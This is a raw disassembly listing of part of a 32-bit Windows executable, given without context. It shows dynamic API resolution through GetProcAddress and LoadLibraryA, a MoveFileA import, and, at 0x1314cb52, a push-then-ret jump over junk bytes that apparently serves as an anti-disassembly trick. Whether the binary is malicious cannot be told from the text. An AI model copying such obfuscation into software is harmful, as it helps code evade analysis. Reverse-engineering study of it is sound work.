1314c8ea:	59                   	pop    %ecx
1314c8eb:	eb 1c                	jmp    0x1314c909
1314c8ed:	8d 85 d0 fa ff ff    	lea    -0x530(%ebp),%eax
1314c8f3:	50                   	push   %eax
1314c8f4:	68 70 0f 15 13       	push   $0x13150f70
1314c8f9:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c8ff:	50                   	push   %eax
1314c900:	ff 15 98 39 15 13    	call   *0x13153998
1314c906:	83 c4 0c             	add    $0xc,%esp
1314c909:	ff 75 08             	pushl  0x8(%ebp)
1314c90c:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314c912:	b9 81 01 00 00       	mov    $0x181,%ecx
1314c917:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314c91d:	8b fc                	mov    %esp,%edi
1314c91f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314c921:	e8 c6 c1 ff ff       	call   0x13148aec
1314c926:	81 c4 08 06 00 00    	add    $0x608,%esp
1314c92c:	8b 7d fc             	mov    -0x4(%ebp),%edi
1314c92f:	68 00 08 00 00       	push   $0x800
1314c934:	6a 00                	push   $0x0
1314c936:	57                   	push   %edi
1314c937:	e8 e6 5c ff ff       	call   0x13142622
1314c93c:	83 c4 0c             	add    $0xc,%esp
1314c93f:	e9 fb d7 ff ff       	jmp    0x1314a13f
1314c944:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c94a:	68 5c 0f 15 13       	push   $0x13150f5c
1314c94f:	50                   	push   %eax
1314c950:	ff 15 98 39 15 13    	call   *0x13153998
1314c956:	59                   	pop    %ecx
1314c957:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314c95d:	59                   	pop    %ecx
1314c95e:	ff 75 08             	pushl  0x8(%ebp)
1314c961:	b9 81 01 00 00       	mov    $0x181,%ecx
1314c966:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314c96c:	8b fc                	mov    %esp,%edi
1314c96e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314c970:	e8 77 c1 ff ff       	call   0x13148aec
1314c975:	81 c4 08 06 00 00    	add    $0x608,%esp
1314c97b:	8d 85 d0 fc ff ff    	lea    -0x330(%ebp),%eax
1314c981:	50                   	push   %eax
1314c982:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c988:	50                   	push   %eax
1314c989:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c98f:	50                   	push   %eax
1314c990:	e8 73 5e ff ff       	call   0x13142808
1314c995:	59                   	pop    %ecx
1314c996:	50                   	push   %eax
1314c997:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c99d:	50                   	push   %eax
1314c99e:	6a 00                	push   $0x0
1314c9a0:	eb 5c                	jmp    0x1314c9fe
1314c9a2:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c9a8:	68 40 0f 15 13       	push   $0x13150f40
1314c9ad:	50                   	push   %eax
1314c9ae:	ff 15 98 39 15 13    	call   *0x13153998
1314c9b4:	59                   	pop    %ecx
1314c9b5:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314c9bb:	59                   	pop    %ecx
1314c9bc:	ff 75 08             	pushl  0x8(%ebp)
1314c9bf:	b9 81 01 00 00       	mov    $0x181,%ecx
1314c9c4:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314c9ca:	8b fc                	mov    %esp,%edi
1314c9cc:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314c9ce:	e8 19 c1 ff ff       	call   0x13148aec
1314c9d3:	81 c4 08 06 00 00    	add    $0x608,%esp
1314c9d9:	8d 85 d0 fc ff ff    	lea    -0x330(%ebp),%eax
1314c9df:	50                   	push   %eax
1314c9e0:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c9e6:	50                   	push   %eax
1314c9e7:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c9ed:	50                   	push   %eax
1314c9ee:	e8 15 5e ff ff       	call   0x13142808
1314c9f3:	59                   	pop    %ecx
1314c9f4:	50                   	push   %eax
1314c9f5:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c9fb:	50                   	push   %eax
1314c9fc:	6a 01                	push   $0x1
1314c9fe:	e8 31 d1 ff ff       	call   0x13149b34
1314ca03:	83 c4 14             	add    $0x14,%esp
1314ca06:	e8 6d c4 ff ff       	call   0x13148e78
1314ca0b:	e9 b0 d5 ff ff       	jmp    0x13149fc0
1314ca10:	e8 63 c4 ff ff       	call   0x13148e78
1314ca15:	be 58 67 17 13       	mov    $0x13176758,%esi
1314ca1a:	33 ff                	xor    %edi,%edi
1314ca1c:	e9 9d d4 ff ff       	jmp    0x13149ebe
1314ca21:	55                   	push   %ebp
1314ca22:	8b ec                	mov    %esp,%ebp
1314ca24:	51                   	push   %ecx
1314ca25:	e8 34 82 ff ff       	call   0x13144c5e
1314ca2a:	85 c0                	test   %eax,%eax
1314ca2c:	75 0a                	jne    0x1314ca38
1314ca2e:	b8 ff 00 00 00       	mov    $0xff,%eax
1314ca33:	e9 16 01 00 00       	jmp    0x1314cb4e
1314ca38:	56                   	push   %esi
1314ca39:	33 f6                	xor    %esi,%esi
1314ca3b:	39 35 38 d1 14 13    	cmp    %esi,0x1314d138
1314ca41:	57                   	push   %edi
1314ca42:	74 27                	je     0x1314ca6b
1314ca44:	68 00 d3 14 13       	push   $0x1314d300
1314ca49:	56                   	push   %esi
1314ca4a:	56                   	push   %esi
1314ca4b:	ff 15 84 37 15 13    	call   *0x13153784
1314ca51:	a3 84 68 17 13       	mov    %eax,0x13176884
1314ca56:	ff 15 70 36 15 13    	call   *0x13153670
1314ca5c:	3d b7 00 00 00       	cmp    $0xb7,%eax
1314ca61:	75 08                	jne    0x1314ca6b
1314ca63:	6a 0a                	push   $0xa
1314ca65:	e8 9d cd ff ff       	call   0x13149807
1314ca6a:	59                   	pop    %ecx
1314ca6b:	39 35 20 24 15 13    	cmp    %esi,0x13152420
1314ca71:	74 05                	je     0x1314ca78
1314ca73:	e8 4e b9 ff ff       	call   0x131483c6
1314ca78:	68 10 69 17 13       	push   $0x13176910
1314ca7d:	68 01 01 00 00       	push   $0x101
1314ca82:	ff 15 50 37 15 13    	call   *0x13153750
1314ca88:	56                   	push   %esi
1314ca89:	e8 b5 c0 ff ff       	call   0x13148b43
1314ca8e:	59                   	pop    %ecx
1314ca8f:	e8 30 5c ff ff       	call   0x131426c4
1314ca94:	39 35 84 0e 15 13    	cmp    %esi,0x13150e84
1314ca9a:	74 18                	je     0x1314cab4
1314ca9c:	ff 35 48 d3 14 13    	pushl  0x1314d348
1314caa2:	ff 35 44 d3 14 13    	pushl  0x1314d344
1314caa8:	e8 22 8f ff ff       	call   0x131459cf
1314caad:	59                   	pop    %ecx
1314caae:	a3 34 d3 14 13       	mov    %eax,0x1314d334
1314cab3:	59                   	pop    %ecx
1314cab4:	39 35 88 0e 15 13    	cmp    %esi,0x13150e88
1314caba:	74 18                	je     0x1314cad4
1314cabc:	ff 35 50 d3 14 13    	pushl  0x1314d350
1314cac2:	ff 35 4c d3 14 13    	pushl  0x1314d34c
1314cac8:	e8 02 8f ff ff       	call   0x131459cf
1314cacd:	59                   	pop    %ecx
1314cace:	a3 38 d3 14 13       	mov    %eax,0x1314d338
1314cad3:	59                   	pop    %ecx
1314cad4:	e8 93 cd ff ff       	call   0x1314986c
1314cad9:	e8 a4 ce ff ff       	call   0x13149982
1314cade:	6a 01                	push   $0x1
1314cae0:	e8 29 cf ff ff       	call   0x13149a0e
1314cae5:	56                   	push   %esi
1314cae6:	e8 23 cf ff ff       	call   0x13149a0e
1314caeb:	6a 01                	push   $0x1
1314caed:	e8 c3 cf ff ff       	call   0x13149ab5
1314caf2:	56                   	push   %esi
1314caf3:	e8 bd cf ff ff       	call   0x13149ab5
1314caf8:	83 c4 10             	add    $0x10,%esp
1314cafb:	39 35 24 d1 14 13    	cmp    %esi,0x1314d124
1314cb01:	bf 5f 9e 14 13       	mov    $0x13149e5f,%edi
1314cb06:	74 15                	je     0x1314cb1d
1314cb08:	8d 45 fc             	lea    -0x4(%ebp),%eax
1314cb0b:	50                   	push   %eax
1314cb0c:	56                   	push   %esi
1314cb0d:	6a 02                	push   $0x2
1314cb0f:	57                   	push   %edi
1314cb10:	56                   	push   %esi
1314cb11:	56                   	push   %esi
1314cb12:	ff 15 30 37 15 13    	call   *0x13153730
1314cb18:	a3 80 a5 17 13       	mov    %eax,0x1317a580
1314cb1d:	39 35 28 d1 14 13    	cmp    %esi,0x1314d128
1314cb23:	74 15                	je     0x1314cb3a
1314cb25:	8d 45 fc             	lea    -0x4(%ebp),%eax
1314cb28:	50                   	push   %eax
1314cb29:	56                   	push   %esi
1314cb2a:	6a 01                	push   $0x1
1314cb2c:	57                   	push   %edi
1314cb2d:	56                   	push   %esi
1314cb2e:	56                   	push   %esi
1314cb2f:	ff 15 30 37 15 13    	call   *0x13153730
1314cb35:	a3 7c a5 17 13       	mov    %eax,0x1317a57c
1314cb3a:	6a ff                	push   $0xffffffff
1314cb3c:	ff 15 fc 36 15 13    	call   *0x131536fc
1314cb42:	6a 0a                	push   $0xa
1314cb44:	e8 be cc ff ff       	call   0x13149807
1314cb49:	59                   	pop    %ecx
1314cb4a:	5f                   	pop    %edi
1314cb4b:	33 c0                	xor    %eax,%eax
1314cb4d:	5e                   	pop    %esi
1314cb4e:	c9                   	leave  
1314cb4f:	c2 04 00             	ret    $0x4
1314cb52:	55                   	push   %ebp
1314cb53:	8b ec                	mov    %esp,%ebp
1314cb55:	51                   	push   %ecx
1314cb56:	53                   	push   %ebx
1314cb57:	56                   	push   %esi
1314cb58:	57                   	push   %edi
1314cb59:	8d 05 a4 cb 14 13    	lea    0x1314cba4,%eax
1314cb5f:	50                   	push   %eax
1314cb60:	c3                   	ret    
1314cb61:	fe                   	(bad)  
1314cb62:	91                   	xchg   %eax,%ecx
1314cb63:	a1 b9 42 bd f2       	mov    0xf2bd42b9,%eax
1314cb68:	25 3d 0f 57 99       	and    $0x99570f3d,%eax
1314cb6d:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
1314cb6f:	5e                   	pop    %esi
1314cb70:	0b 32                	or     (%edx),%esi
1314cb72:	bb 1b 9a 07 42       	mov    $0x42079a1b,%ebx
1314cb77:	ce                   	into   
1314cb78:	b4 14                	mov    $0x14,%ah
1314cb7a:	21 d9                	and    %ebx,%ecx
1314cb7c:	64 2f                	fs das 
1314cb7e:	70 b4                	jo     0x1314cb34
1314cb80:	8b f3                	mov    %ebx,%esi
1314cb82:	aa                   	stos   %al,%es:(%edi)
1314cb83:	87 04 33             	xchg   %eax,(%ebx,%esi,1)
1314cb86:	8b 30                	mov    (%eax),%esi
1314cb88:	74 1a                	je     0x1314cba4
1314cb8a:	f0 b8 00 00 00 00    	lock mov $0x0,%eax
1314cb90:	f3 aa                	rep stos %al,%es:(%edi)
1314cb92:	33 d9                	xor    %ecx,%ebx
1314cb94:	33 4e 01             	xor    0x1(%esi),%ecx
1314cb97:	ff 30                	pushl  (%eax)
1314cb99:	68 c2 bf 0f 00       	push   $0xfbfc2
1314cb9e:	e8 01 00 00 00       	call   0x1314cba4
1314cba3:	c3                   	ret    
1314cba4:	e8 b5 80 ff ff       	call   0x13144c5e
1314cba9:	68 d0 06 15 13       	push   $0x131506d0
1314cbae:	e8 7c 8c ff ff       	call   0x1314582f
1314cbb3:	50                   	push   %eax
1314cbb4:	e8 73 5b ff ff       	call   0x1314272c
1314cbb9:	59                   	pop    %ecx
1314cbba:	33 f6                	xor    %esi,%esi
1314cbbc:	85 c0                	test   %eax,%eax
1314cbbe:	59                   	pop    %ecx
1314cbbf:	75 3d                	jne    0x1314cbfe
1314cbc1:	68 10 22 15 13       	push   $0x13152210
1314cbc6:	68 80 06 15 13       	push   $0x13150680
1314cbcb:	ff 15 08 10 14 13    	call   *0x13141008
1314cbd1:	50                   	push   %eax
1314cbd2:	ff 15 00 10 14 13    	call   *0x13141000
1314cbd8:	89 45 fc             	mov    %eax,-0x4(%ebp)
1314cbdb:	6a 01                	push   $0x1
1314cbdd:	6a 00                	push   $0x0
1314cbdf:	ff 55 fc             	call   *-0x4(%ebp)
1314cbe2:	89 35 20 24 15 13    	mov    %esi,0x13152420
1314cbe8:	89 35 18 24 15 13    	mov    %esi,0x13152418
1314cbee:	89 35 14 24 15 13    	mov    %esi,0x13152414
1314cbf4:	c7 05 90 a5 17 13 01 	movl   $0x1,0x1317a590
1314cbfb:	00 00 00 
1314cbfe:	39 35 38 d1 14 13    	cmp    %esi,0x1314d138
1314cc04:	74 34                	je     0x1314cc3a
1314cc06:	68 00 d3 14 13       	push   $0x1314d300
1314cc0b:	56                   	push   %esi
1314cc0c:	56                   	push   %esi
1314cc0d:	ff 15 84 37 15 13    	call   *0x13153784
1314cc13:	a3 84 68 17 13       	mov    %eax,0x13176884
1314cc18:	ff 15 70 36 15 13    	call   *0x13153670
1314cc1e:	3d b7 00 00 00       	cmp    $0xb7,%eax
1314cc23:	75 09                	jne    0x1314cc2e
1314cc25:	56                   	push   %esi
1314cc26:	ff 15 b0 36 15 13    	call   *0x131536b0
1314cc2c:	eb 0c                	jmp    0x1314cc3a
1314cc2e:	ff 35 84 68 17 13    	pushl  0x13176884
1314cc34:	ff 15 80 33 15 13    	call   *0x13153380
1314cc3a:	39 35 0c 24 15 13    	cmp    %esi,0x1315240c
1314cc40:	74 05                	je     0x1314cc47
1314cc42:	e8 75 47 ff ff       	call   0x131413bc
1314cc47:	39 35 18 24 15 13    	cmp    %esi,0x13152418
1314cc4d:	74 4a                	je     0x1314cc99
1314cc4f:	e8 d3 60 ff ff       	call   0x13142d27
1314cc54:	85 c0                	test   %eax,%eax
1314cc56:	75 33                	jne    0x1314cc8b
1314cc58:	bf 48 d1 14 13       	mov    $0x1314d148,%edi
1314cc5d:	57                   	push   %edi
1314cc5e:	e8 d3 5f ff ff       	call   0x13142c36
1314cc63:	c7 04 24 70 d1 14 13 	movl   $0x1314d170,(%esp)
1314cc6a:	57                   	push   %edi
1314cc6b:	e8 28 60 ff ff       	call   0x13142c98
1314cc70:	59                   	pop    %ecx
1314cc71:	85 c0                	test   %eax,%eax
1314cc73:	59                   	pop    %ecx
1314cc74:	75 08                	jne    0x1314cc7e
1314cc76:	89 35 18 24 15 13    	mov    %esi,0x13152418
1314cc7c:	eb 1b                	jmp    0x1314cc99
1314cc7e:	89 35 14 24 15 13    	mov    %esi,0x13152414
1314cc84:	e8 9e 60 ff ff       	call   0x13142d27
1314cc89:	eb 06                	jmp    0x1314cc91
1314cc8b:	89 35 14 24 15 13    	mov    %esi,0x13152414
1314cc91:	39 35 18 24 15 13    	cmp    %esi,0x13152418
1314cc97:	75 20                	jne    0x1314ccb9
1314cc99:	39 35 14 24 15 13    	cmp    %esi,0x13152414
1314cc9f:	74 18                	je     0x1314ccb9
1314cca1:	e8 3d 90 ff ff       	call   0x13145ce3
1314cca6:	68 80 d1 14 13       	push   $0x1314d180
1314ccab:	68 21 ca 14 13       	push   $0x1314ca21
1314ccb0:	e8 59 92 ff ff       	call   0x13145f0e
1314ccb5:	59                   	pop    %ecx
1314ccb6:	59                   	pop    %ecx
1314ccb7:	eb 06                	jmp    0x1314ccbf
1314ccb9:	56                   	push   %esi
1314ccba:	e8 62 fd ff ff       	call   0x1314ca21
1314ccbf:	5f                   	pop    %edi
1314ccc0:	5e                   	pop    %esi
1314ccc1:	33 c0                	xor    %eax,%eax
1314ccc3:	5b                   	pop    %ebx
1314ccc4:	c9                   	leave  
1314ccc5:	c3                   	ret    
1314ccc6:	cc                   	int3   
1314ccc7:	cc                   	int3   
1314ccc8:	f0 cc                	lock int3 
	...
1314ccd2:	00 00                	add    %al,(%eax)
1314ccd4:	46                   	inc    %esi
1314ccd5:	cd 00                	int    $0x0
1314ccd7:	00 00                	add    %al,(%eax)
1314ccd9:	10 00                	adc    %al,(%eax)
	...
1314ccef:	00 10                	add    %dl,(%eax)
1314ccf1:	cd 00                	int    $0x0
1314ccf3:	00 22                	add    %ah,(%edx)
1314ccf5:	cd 00                	int    $0x0
1314ccf7:	00 32                	add    %dh,(%edx)
1314ccf9:	cd 00                	int    $0x0
1314ccfb:	00 04 cd 00 00 00 00 	add    %al,0x0(,%ecx,8)
1314cd02:	00 00                	add    %al,(%eax)
1314cd04:	dd 01                	fldl   (%ecx)
1314cd06:	4d                   	dec    %ebp
1314cd07:	6f                   	outsl  %ds:(%esi),(%dx)
1314cd08:	76 65                	jbe    0x1314cd6f
1314cd0a:	46                   	inc    %esi
1314cd0b:	69 6c 65 41 00 3e 01 	imul   $0x47013e00,0x41(%ebp,%eiz,2),%ebp
1314cd12:	47 
1314cd13:	65 74 50             	gs je  0x1314cd66
1314cd16:	72 6f                	jb     0x1314cd87
1314cd18:	63 41 64             	arpl   %ax,0x64(%ecx)
1314cd1b:	64 72 65             	fs jb  0x1314cd83
1314cd1e:	73 73                	jae    0x1314cd93
1314cd20:	00 00                	add    %al,(%eax)
1314cd22:	c2 01 4c             	ret    $0x4c01
1314cd25:	6f                   	outsl  %ds:(%esi),(%dx)
1314cd26:	61                   	popa   
1314cd27:	64 4c                	fs dec %esp
1314cd29:	69 62 72 61 72 79 41 	imul   $0x41797261,0x72(%edx),%esp
1314cd30:	00 00                	add    %al,(%eax)
1314cd32:	26 01 47 65          	add    %eax,%es:0x65(%edi)
1314cd36:	74 4d                	je     0x1314cd85
1314cd38:	6f                   	outsl  %ds:(%esi),(%dx)
1314cd39:	64 75 6c             	fs jne 0x1314cda8
1314cd3c:	65 48                	gs dec %eax
1314cd3e:	61                   	popa   
1314cd3f:	6e                   	outsb  %ds:(%esi),(%dx)
1314cd40:	64 6c                	fs insb (%dx),%es:(%edi)
1314cd42:	65 41                	gs inc %ecx
1314cd44:	00 00                	add    %al,(%eax)
1314cd46:	4b                   	dec    %ebx
1314cd47:	45                   	inc    %ebp
1314cd48:	52                   	push   %edx
1314cd49:	4e                   	dec    %esi
1314cd4a:	45                   	inc    %ebp
1314cd4b:	4c                   	dec    %esp
1314cd4c:	33 32                	xor    (%edx),%esi
1314cd4e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
1314cd51:	6c                   	insb   (%dx),%es:(%edi)
	...
